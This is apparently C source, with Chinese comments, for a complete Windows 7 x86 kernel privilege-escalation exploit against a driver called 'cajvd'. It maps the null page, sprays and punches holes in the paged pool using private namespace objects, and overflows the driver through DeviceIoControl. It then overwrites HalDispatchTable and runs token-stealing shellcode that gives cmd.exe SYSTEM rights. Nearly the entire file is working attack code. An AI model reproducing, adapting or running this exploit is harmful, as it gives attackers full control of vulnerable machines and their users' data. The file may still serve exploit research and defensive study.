#include <windows.h>
#include <stdio.h>
#include <winioctl.h>
#include <winsvc.h>  
#include <conio.h>  
#include <sddl.h>
#include "ntapi.h"


#pragma comment(lib,"Advapi32.lib")
#pragma comment(linker,"/defaultlib:ntdll.lib")  

#define PAGE_SIZE 0x1000
#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OPEN_IF 0x00000003
#define KERNEL_NAME_LENGTH 0x0D
#define BUFFER_LENGTH 0x04

//触发漏洞使用的IoControlCode
#define IOCTL_METHOD_NEITHER 0x8888A003

int g_uCr0 = 0;
int g_isRing0ShellcodeCalled = 0;
void* kernelHandle;


#define IOCTRL_BASE 0xB000EC1C

/*back
#define MYIOCTRL_CODE(i) \
	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE+i, METHOD_NEITHER,FILE_ANY_ACCESS)
*/
///////////////////////////////////////////
#define MYIOCTRL_CODE(i) \
	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE+i, METHOD_BUFFERED,FILE_ANY_ACCESS)
///////////////////////////////////////////

#define CTL_HELLO MYIOCTRL_CODE(0)
#define CTL_PRINT MYIOCTRL_CODE(1)
#define CTL_BYE MYIOCTRL_CODE(2)


#define DEVICE_NAME "cajvd"
#define LINK_NAME ".\\cajvd.sys"


typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(IN HANDLE     ProcessHandle,
													 IN OUT PVOID  *BaseAddress,
													 IN ULONG      ZeroBits,
													 IN OUT PULONG AllocationSize,
													 IN ULONG      AllocationType,
													 IN ULONG      Protect);


typedef NTSTATUS (WINAPI *ntDeletePrivateNamespace_t)(_In_ HANDLE Handle);




NtAllocateVirtualMemory_t     NtAllocateVirtualMemory;
ntDeletePrivateNamespace_t    ntDeletePrivateNamespace;

//申请内存的函数
PVOID MyAllocateMemory(IN ULONG Length)
{
	HMODULE hNtdll;
//	SIZE_T RegionSize = 0x1000;

	PVOID BaseAddress = NULL;//(PVOID)0x00000001; 
	NTSTATUS NtStatus = 0;

	hNtdll = GetModuleHandle("ntdll.dll");

	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	ntDeletePrivateNamespace = (ntDeletePrivateNamespace_t)GetProcAddress(hNtdll, "NtDeletePrivateNamespace");

	if (!NtAllocateVirtualMemory) {
		printf("\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return 0;
	}

	// 0地址申请空间
	NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
		&BaseAddress,
		0,
		&Length,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if (NtStatus) {
		printf("\t\t\t\t[-] Virtual Memory Allocation Failed: 0x%x\n", NtStatus);
		return 0;
	}
	else {
		printf("\t\t[+] Memory Allocated: 0x%p\n", BaseAddress);
		printf("\t\t[+] Allocation Size: 0x%X\n", Length);
		FreeLibrary(hNtdll);
		RtlZeroMemory(BaseAddress, Length);
		return BaseAddress;
	}

	FreeLibrary(hNtdll);

	return NULL;
}

//释放内存的函数
VOID MyFreeMemory(IN PVOID BaseAddress)
{
	NTSTATUS NtStatus;
	ULONG FreeSize = 0;
	NtStatus = NtFreeVirtualMemory(
		NtCurrentProcess(),
		&BaseAddress,
		&FreeSize,
		MEM_RELEASE);
}

//HANDLE    EventObjectArrayA[10000];
//HANDLE    EventObjectArrayB[5000];
HANDLE    EventPriNamespace[10000];
HANDLE    EventPriNamespacb[5000];
HANDLE    g_hBoundary;
PCTSTR    g_szNamespace = "priname";


// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID



NTSTATUS __declspec(naked) payload() {
	__asm {
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
	}
	__asm {
		pushad                                   ; Save registers state

			mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
			; Start of Token Stealing Stub
			xor eax, eax                         ; Set ZERO
			mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
			                                     ; _KTHREAD is located at FS:[0x124]
	    	mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
			mov ecx, eax                         ; Copy current process _EPROCESS structure

			mov eax, [eax+0xb8]                  ; Flink 
procloop: 		
			mov eax, [eax]
			lea edx, [eax-0xb8]                  ; KPROCESS 	
			add edx, 0x16c                       ; Module Name 	
			cmp dword ptr [edx], 0x76697244      ; cmd.exe 	
			jne procloop 	
			sub edx, 0x16c
			mov eax, edx
			mov edx, SYSTEM_PID
			
			mov ecx, [ecx + FLINK_OFFSET]        ; Get nt!_EPROCESS.ActiveProcessLinks.Flink ECX=88939030
SearchSystemPID:
			mov ecx, [ecx]
		    lea ebx, [ecx-0xb8]                  ; KPROCESS 	
			cmp [ebx + PID_OFFSET], edx          ; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID
			

			mov edx, [ebx + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
			mov [eax + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
		                                         ; with SYSTEM process nt!_EPROCESS.Token
												 ; End of Token Stealing Stub
											  	 ; Kernel Recovery Stub
		popad                                    ; Restore registers state
	}

	g_isRing0ShellcodeCalled = 1;
	__asm 
	{
		mov eax, 0x1
		retn
	}
}




BOOL MapNullPage() {
	HMODULE hNtdll;
	SIZE_T RegionSize = 0x1000;

	PVOID BaseAddress = (PVOID)0x00000001; 
	NTSTATUS NtStatus = 0;

	hNtdll = GetModuleHandle("ntdll.dll");

	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		printf("\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return 0;
	}

	// 0地址申请空间
	NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
		&BaseAddress,
		0,
		&RegionSize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE);

	if (NtStatus) {
		printf("\t\t\t\t[-] Virtual Memory Allocation Failed: 0x%x\n", NtStatus);
		return 0;
	}
	else {
		printf("\t\t[+] Memory Allocated: 0x%p\n", BaseAddress);
		printf("\t\t[+] Allocation Size: 0x%X\n", RegionSize);
	}

	FreeLibrary(hNtdll);

	return 1;
}




DWORD WINAPI SprayPagedPool() {
	UINT32 i = 0, j=0;

	BYTE localAdminSID[SECURITY_MAX_SID_SIZE];  
	
	
	//SID  sid;
	PSID pLocalAdminSID = &localAdminSID;  
	DWORD cbSID = sizeof(localAdminSID);  

	SECURITY_ATTRIBUTES sa;  
	sa.nLength = sizeof(sa);  
	sa.bInheritHandle = FALSE;  

//	RtlFillMemory(EventObjectArrayA, sizeof(EventObjectArrayA), 0x0);
//	RtlFillMemory(EventObjectArrayB, sizeof(EventObjectArrayB), 0x0);
//	RtlFillMemory(EventPriNamespace, sizeof(EventPriNamespace), 0x0);
	RtlFillMemory(EventPriNamespacb, sizeof(EventPriNamespacb), 0x0);
//	__asm int 3;
/*	// create 1w eventA
	for (i = 0; i < 20000; i++) {
		EventObjectArrayA[i] = CreateEvent(NULL, FALSE, FALSE, NULL);

		if (!EventObjectArrayA[i]) {
			printf("\t\t[-] Failed To Allocate Event Objects: 0x%X\n", GetLastError());
			return;
		}
	}

	// create 5k eventB
	for (i = 0; i < 10000; i++) {
		EventObjectArrayB[i] = CreateEvent(NULL, FALSE, FALSE, NULL);

		if (!EventObjectArrayB[i]) {
			printf("\t\t[-] Failed To Allocate Event Objects: 0x%X\n", GetLastError());
			return;
		}
	}
*/
	// create 10k prinamaspace

	
	int n ;
	char str[10]={0};
	/*
	for (i = 0; i<10000; i++)
	{
		char szBoundaryText[6] = "a";
		memset(str,0, 10);
		// 创建边界描述符  
		itoa(i, str, 10);
		n=strlen(str);
		for( j=0; j<4-n; j++)
			strcat(szBoundaryText, "c");

		strcat(szBoundaryText, (const char*)str);
		g_hBoundary = CreateBoundaryDescriptor((LPCSTR)szBoundaryText, 0);

		if (!CreateWellKnownSid(WinBuiltinUsersSid, NULL, pLocalAdminSID, &cbSID))  
		{  
			printf("添加安全描述符到边界描述符失败: %u\r\n", GetLastError());  
			return 0;  
		} 

		// 将本地管理员组的安全描述符与边界描述符关联起来  
		// 只有管理员身份运行的应用程序能获得该命名空间下的内核对象  
		if (!AddSIDToBoundaryDescriptor(&g_hBoundary, pLocalAdminSID))  
		{  
			printf("添加安全描述符到边界描述符失败: %u\r\n", GetLastError());  
			return 0;  
		}  

		if (!ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;;GA;;;BA)",SDDL_REVISION_1, &sa.lpSecurityDescriptor, NULL))  
		{  
			printf("安全描述符创建失败: %u\r\n",  GetLastError());  
			return 0;  
		}  

		//ConvertStringSecurityDescriptorToSecurityDescriptor(TEXT("D(A;;GA;;;BA)"),  SDDL_REVISION_1,&sa.lpSecurityDescriptor,NULL);
		EventPriNamespace[i] =  CreatePrivateNamespace(&sa, g_hBoundary, szBoundaryText);  
		//n = GetLastError();
		//printf("0x%x\n", n);
	}
	
	*/
	// create 6k prinamaspacb 
	
	n=0;
	for (i = 0; i<5000; i++)
	{
		char szBoundaryText[6] = "b";
		memset(str, 0, 10);
		// 创建边界描述符  
		itoa(i, str, 10);
		n=strlen(str);
		for( j=0; j<4-n; j++)
			strcat(szBoundaryText, "c");

		strcat(szBoundaryText, (const char*)str);
		g_hBoundary = CreateBoundaryDescriptor((LPCSTR)szBoundaryText, 0);

		if (!CreateWellKnownSid(WinBuiltinUsersSid, NULL, pLocalAdminSID, &cbSID))  
		{  
			printf("添加安全描述符到边界描述符失败: %u\r\n", GetLastError());  
			return 0;  
		} 

		// 将本地管理员组的安全描述符与边界描述符关联起来  
		// 只有管理员身份运行的应用程序能获得该命名空间下的内核对象  
		if (!AddSIDToBoundaryDescriptor(&g_hBoundary, pLocalAdminSID))  
		{  
			printf("添加安全描述符到边界描述符失败: %u\r\n", GetLastError());  
			return 0;  
		}  

		if (!ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;;GA;;;BA)",SDDL_REVISION_1, &sa.lpSecurityDescriptor, NULL))  
		{  
			printf("安全描述符创建失败: %u\r\n",  GetLastError());  
			return 0;  
		}  

		//ConvertStringSecurityDescriptorToSecurityDescriptor(TEXT("D(A;;GA;;;BA)"),  SDDL_REVISION_1,&sa.lpSecurityDescriptor,NULL);
		EventPriNamespacb[i] =  CreatePrivateNamespace(&sa, g_hBoundary, szBoundaryText);  
		//n = GetLastError();
		//printf("0x%x\n", n);
	}
	printf("[+] create 5000 objectB success\n");
	return 1;
}





DWORD SprayPagedPool2() {
	UINT32 i = 0, j=0;

	BYTE localAdminSID[SECURITY_MAX_SID_SIZE];  
	
	
	//SID  sid;
	PSID pLocalAdminSID = &localAdminSID;  
	DWORD cbSID = sizeof(localAdminSID);  

	SECURITY_ATTRIBUTES sa;  
	sa.nLength = sizeof(sa);  
	sa.bInheritHandle = FALSE;  

	// create 10k prinamaspace
	RtlFillMemory(EventPriNamespace, sizeof(EventPriNamespace), 0x0);
	
	int n,m ;
	char str[10]={0};
	char szBoundaryText[3940] = "a";
	for (i = 0; i<5000; i++)
	{
		//char szBoundaryText[10] = "a";
		memset(szBoundaryText, 0, 3940);
		szBoundaryText[0] = 'a';
		memset(str,0, 10);
		// 创建边界描述符  
		itoa(i, str, 10);
	//	m = i%10;
		n=strlen(str);
		for( j=0; j<3938-n; j++)
			strcat(szBoundaryText, "c");

		strcat(szBoundaryText, (const char*)str);
		g_hBoundary = CreateBoundaryDescriptor((LPCSTR)szBoundaryText, 0);

		if (!CreateWellKnownSid(WinBuiltinUsersSid, NULL, pLocalAdminSID, &cbSID))  
		{  
			printf("添加安全描述符到边界描述符失败: %u\r\n", GetLastError());  
			return 0;  
		} 

		// 将本地管理员组的安全描述符与边界描述符关联起来  
		// 只有管理员身份运行的应用程序能获得该命名空间下的内核对象  
		if (!AddSIDToBoundaryDescriptor(&g_hBoundary, pLocalAdminSID))  
		{  
			printf("添加安全描述符到边界描述符失败: %u\r\n", GetLastError());  
			return 0;  
		}  

		if (!ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;;GA;;;BA)",SDDL_REVISION_1, &sa.lpSecurityDescriptor, NULL))  
		{  
			printf("安全描述符创建失败: %u\r\n",  GetLastError());  
			return 0;  
		}  

		//ConvertStringSecurityDescriptorToSecurityDescriptor(TEXT("D(A;;GA;;;BA)"),  SDDL_REVISION_1,&sa.lpSecurityDescriptor,NULL);
		EventPriNamespace[i] =  CreatePrivateNamespace(&sa, g_hBoundary, szBoundaryText);  

	}
	
	
	printf("[+] create 5000 objectS success\n");


	return 1; 
}






DWORD WINAPI CreateHolesInPagedPoolByCoalescingObjects() {
	UINT32 i = 0;
	UINT32 j = 0;


	//////////////////////////////////////////////////////////////////////////
	printf("[+] create holes In KernelPool...\n");
	for (i = 0; i < 5000; i += 2) {
		if ( EventPriNamespace[i] != NULL ) {
			ClosePrivateNamespace(EventPriNamespace[i], PRIVATE_NAMESPACE_FLAG_DESTROY);
		}

	}
	//////////////////////////////////////////////////////////////////////////

	return 0;
}




VOID FreeObjects() {
	UINT32 i = 0;
	UINT32 j = 0;

	printf("[+] freeObjects && dword shooting...\n");


	for (i = 1; i < 5000; i+=2 ) {

		if ( EventPriNamespace[i] != NULL ) {
			ntDeletePrivateNamespace(EventPriNamespace[i]);
			//ClosePrivateNamespace(EventPriNamespace[i], PRIVATE_NAMESPACE_FLAG_DESTROY);
		//	printf("[+] close: %d\n",i);
		}
	}

}




int Exploit()
{

	PULONG  UserModeBuffer = NULL;
//	char shellcode[]="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0ccccr2A"; // offset 513
	PVOID  Memory = NULL;
	PVOID  Payload = &payload;
	HANDLE hDevice;
	DWORD  dwAttackRes = 0;

	//////////////////////////////////////////////////////////////////////////
	/// 获取xHalQuerySystemInformation的内存地址 部分变量
	NTSTATUS NtStatus;
	ULONG    ReturnLength = 0;
	ULONG    ImageBase;
	PVOID    MappedBase = NULL;
	UCHAR ImageName[KERNEL_NAME_LENGTH];
	ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
	PVOID HalDispatchTable;
	PVOID xHalQuerySystemInformation;
	ULONG ShellCodeSize = PAGE_SIZE;
	PVOID ShellCodeAddress;
	PVOID BaseAddress = NULL;
	UNICODE_STRING DllName;
	ANSI_STRING ProcedureName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK IoStatusBlock;
	SYSTEM_MODULE_INFORMATION *ModuleInformation = NULL;
	LARGE_INTEGER Interval;
	ULONG InputData=0;
	HANDLE hThread = NULL;
	HANDLE hThread2 = NULL;
	STARTUPINFO StartupInfo = {0};
	PROCESS_INFORMATION ProcessInformation = {0};
	//////////////////////////////////////////////////////////////////////////


	//__asm int 3;
	//////////////////////////////////////////////////////////////////////////
	/// 获取内核函数xHalQuerySystemInformation内存地址
	/// 获取内核模块列表数据长度存在ReturnLength
	NtStatus = NtQuerySystemInformation(
		SystemModuleInformation,
		ModuleInformation,
		ReturnLength,
		&ReturnLength);

	if( NtStatus!=STATUS_INFO_LENGTH_MISMATCH )
	{
		printf("NtQuerySystemInformation get len failed! NtStatus=%.08X\n", NtStatus);
		goto ret;
	}

	//申请内存
	ReturnLength = (ReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
	ModuleInformation = (SYSTEM_MODULE_INFORMATION *)MyAllocateMemory(ReturnLength);
	if(ModuleInformation==NULL)
	{
		printf("MyAllocateMemory failed! Length=%.8X\n", ReturnLength); 
		goto ret;
	}

	//获取内核模块列表数据
	NtStatus = NtQuerySystemInformation(
		SystemModuleInformation,
		ModuleInformation,
		ReturnLength,
		NULL);
	if(NtStatus != STATUS_SUCCESS)
	{
		printf("NtQuerySystemInformation get info failed! NtStatus=%.8X\n", NtStatus); 
		goto ret;
	}

	//保存内核第一个模块（即nt模块）基址和名称，并打印
	ImageBase = (ULONG)(ModuleInformation->Module[0].Base);
	RtlMoveMemory(
		ImageName,
		(PVOID)(ModuleInformation->Module[0].ImageName + ModuleInformation->Module[0].PathLength),
		KERNEL_NAME_LENGTH);
	printf("[+] ImageBase=0x%.8X ImageName=%s\n",ImageBase,	ImageName);


	//获取内核模块名称字符串的Unicode字符串
	RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);

	//加载内核模块到本进程空间
	NtStatus = LdrLoadDll(
		NULL,                // DllPath
		&DllCharacteristics, // DllCharacteristics
		&DllName,            // DllName
		&MappedBase);        // DllHandle
	if(NtStatus)
	{
		printf("LdrLoadDll failed! NtStatus=%.8X\n", NtStatus);    
		goto ret;
	}

	//获取内核模块在本进程空间中导出名称HalDispatchTable的地址
	RtlInitAnsiString(&ProcedureName, (PUCHAR)"HalDispatchTable");
	NtStatus = LdrGetProcedureAddress(
		(PVOID)MappedBase,          // DllHandle
		&ProcedureName,             // ProcedureName
		0,                          // ProcedureNumber OPTIONAL
		(PVOID*)&HalDispatchTable); // ProcedureAddress
	if(NtStatus)
	{
		printf("LdrGetProcedureAddress failed! NtStatus=%.8X\n", NtStatus);    
		goto ret;
	}

	//计算实际的HalDispatchTable内核地址
	HalDispatchTable = (PVOID)((ULONG)HalDispatchTable - (ULONG)MappedBase);
	HalDispatchTable = (PVOID)((ULONG)HalDispatchTable + (ULONG)ImageBase);

	//HalDispatchTable中的第二个ULONG就是HalQuerySystemInformation函数的地址
	xHalQuerySystemInformation = (PVOID)((ULONG)HalDispatchTable + sizeof(ULONG));

	//打印HalDispatchTable内核地址和xHalQuerySystemInformation值
	printf("[+] HalDispatchTable=%p xHalQuerySystemInformation=%p\n",
		HalDispatchTable,
		xHalQuerySystemInformation);
	//////////////////////////////////////////////////////////////////////////

	// 申请内存 
	//UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 464);
	//UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 520);
	UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1e18);
	if( !UserModeBuffer ){
		printf("HeapAlloc Failed!\n");
		return 0;
	}

	printf("[+] UserModeBuffer: 0x%x\n",UserModeBuffer);

	if (!MapNullPage()) {
		printf("\t\t[-] Failed Mapping Null Page: 0x%X\n", GetLastError());
		return 0;
	}

	// copy payload to 0x0
	RtlMoveMemory(
		(PVOID)0x100,
		(PVOID)payload,
		0x1000);


	RtlFillMemory((PVOID)UserModeBuffer, 0x1e18, 0x41);
	Memory = (PVOID)((ULONG)UserModeBuffer + 0x1d4c);  // 0
	*(PULONG)Memory = (ULONG)0x00000030;			
	Memory = (PVOID)((ULONG)Memory + 4);  // 4
	*(PULONG)Memory = (ULONG)0x000000a8;
	Memory = (PVOID)((ULONG)Memory + 4);  // 8
	*(PULONG)Memory = (ULONG)0x0000003c;
	Memory = (PVOID)((ULONG)Memory + 4);  // c
	*(PULONG)Memory = (ULONG)0x88900300;  //88900300
	Memory = (PVOID)((ULONG)Memory + 4);  // 10
	*(PULONG)Memory = (ULONG)0x00000002;
	Memory = (PVOID)((ULONG)Memory + 4);  // 14
	*(PULONG)Memory = (ULONG)0x00000001;
	Memory = (PVOID)((ULONG)Memory + 4);  // 18
	*(PULONG)Memory = (ULONG)0x00000000;
	Memory = (PVOID)((ULONG)Memory + 4);  // 1c
	*(PULONG)Memory = (ULONG)0x00080003;
	Memory = (PVOID)((ULONG)Memory + 4);  // 20
	*(PULONG)Memory = (ULONG)0x88900300;  //88900300
	Memory = (PVOID)((ULONG)Memory + 4);  // 24
//	*(PULONG)Memory = (ULONG)0x988b7e57; // 0x98647217  984578b7  988b7e57
	*(PULONG)Memory = (ULONG)0x00000000;
	Memory = (PVOID)((ULONG)Memory + 4);  // 28
	*(PULONG)Memory = (ULONG)0x00000000;
	Memory = (PVOID)((ULONG)Memory + 0xa0); // entrypoint
	*(PULONG)Memory = (ULONG)0x00000088;  //0x41414141;
	


//	*(PULONG)0x0    = (ULONG)0x10;
//	*(PULONG)0x10   = (ULONG)0x0; //0x43434343 // what
	*(PULONG)0x88   = (ULONG)0x100; 
	*(PULONG)0x8c   = (ULONG)xHalQuerySystemInformation;
	*(PUCHAR)0xf8   = '\xEB';
	*(PUCHAR)0xf9   = '\x10';
	*(PUCHAR)0x100  = '\xEB';
	*(PUCHAR)0x101  = '\xF6';




//	*(PULONG)0x100  = (ULONG)Payload; //0x42424242;  // where     
	//////////////////////////////////////////////////////////////////////////
	/// 上述两行代码，是双向链表的第一轮操作，要考虑到第一轮第二轮都不报错，且可以使我们想写的数据写入目标地址，
	/// 所以修改如下
//	*(PULONG)0x4 = (ULONG)xHalQuerySystemInformation; //0x43434343 // what
//	*(PULONG)0x14 = (ULONG)xHalQuerySystemInformation;

//	printf("*0x60: 0x%x\n", *(PULONG)0x60);
	SprayPagedPool2();

	CreateHolesInPagedPoolByCoalescingObjects();

/*
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SprayPagedPool, NULL, 0,0);
	if (!hThread) {
		printf("\t\t[-] Failed To Create Exploit Thread: 0x%X\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	if (WaitForSingleObject(hThread, INFINITE)) {
		// Terminate the thread
		printf("start create hole\n");
		hThread2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CreateHolesInPagedPoolByCoalescingObjects, NULL, 0,0);
		if (!hThread2) {
			printf("\t\t[-] Failed To Create Exploit Thread: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	}

//	
	WaitForSingleObject(hThread2, NULL);
	*/
	printf("[+] begin attack!send payload 2 ring0\n");
	
	

	hDevice = CreateFile("\\\\.\\cajvd",  
		GENERIC_WRITE | GENERIC_READ,  
		0,  
		NULL,  
		OPEN_EXISTING,  
		0,  
		NULL);  
	if( hDevice != INVALID_HANDLE_VALUE )  
	{
		printf( "[+] Create Device ok ! \n" );  
	}
	else  
	{
		printf( "Create Device failed %d ! \n", GetLastError() ); 
		return 0;
	}


	//DeviceIoControl(hDevice, CTL_HELLO, (PVOID)UserModeBuffer, 464, NULL, 0, &dwAttackRes, NULL);
	DeviceIoControl(hDevice, (unsigned int)0xB000EC1C, (PVOID)UserModeBuffer, 0x1e18, NULL, 0, &dwAttackRes, NULL);
//	FreeEventObjects();

	FreeObjects();
	HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);

	Sleep(2000);

	//触发漏洞
	NtStatus = NtQueryIntervalProfile(
		ProfileTotalIssues, // Source
		NULL);              // Interval
	if(NtStatus)
	{
		printf("NtQueryIntervalProfile failed! NtStatus=%.8X\n", NtStatus);
		goto ret;
	}
	printf("[+] execute shellcode ...\n");



	if( g_isRing0ShellcodeCalled )
	{
		printf("[+] exploit succeed!\n");
	}else
	{
		printf("[-] plz try again\n");
	}

	StartupInfo.wShowWindow = SW_SHOW;
	StartupInfo.cb          = sizeof(STARTUPINFO);
	StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;

	printf("[*] Enjoy As SYSTEM\n\n");

	if (!CreateProcess(NULL,
		"cmd.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInformation)) {
			printf("[-] Failed to Create Target Process: 0x%X\n", GetLastError());
			Sleep(2000);
			exit(EXIT_FAILURE);
	}

	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);

	// Close the open handles
	CloseHandle(ProcessInformation.hThread);
	CloseHandle(ProcessInformation.hProcess);
	UserModeBuffer = NULL;

//	return 1;
	//CloseHandle(hDevice);

ret:
	

//	system("pause");
	//释放申请的内存
	if (ModuleInformation)
	{
		MyFreeMemory(ModuleInformation);
	}
	//卸载本进程中的内核模块
	if (MappedBase)
	{
		LdrUnloadDll((PVOID)MappedBase);
	}
	//关闭句柄
	if(hDevice)
	{
		NtStatus = NtClose(hDevice);
		if(NtStatus)
		{
			printf("NtClose failed! NtStatus=%.8X\n", NtStatus);    
		}
	}
	return 0;
}




int main()
{
	
	Exploit();
	return 0;
}